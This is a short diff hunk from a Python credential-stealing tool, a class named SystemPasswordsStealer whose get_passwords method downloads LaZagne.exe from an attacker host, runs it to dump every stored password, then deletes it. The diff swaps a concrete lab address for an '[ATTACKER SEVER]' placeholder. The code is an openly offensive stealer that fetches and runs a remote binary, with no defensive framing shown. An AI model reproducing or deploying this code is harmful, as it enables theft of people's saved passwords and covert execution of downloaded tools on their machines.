@@ -21,7 +21,7 @@ class SystemPasswordsStealer:
     def get_passwords(self):
         try:
             os.chdir(self.temp_directory)
-            self.upload("http://10.0.2.15/evil-files/LaZagne.exe")
+            self.upload("[ATTACKER SEVER]/LaZagne.exe")
             self.passwords = subprocess.check_output('"LaZagne.exe" all', shell=True).decode()
             os.remove("LaZagne.exe")
         except subprocess.CalledProcessError as e:
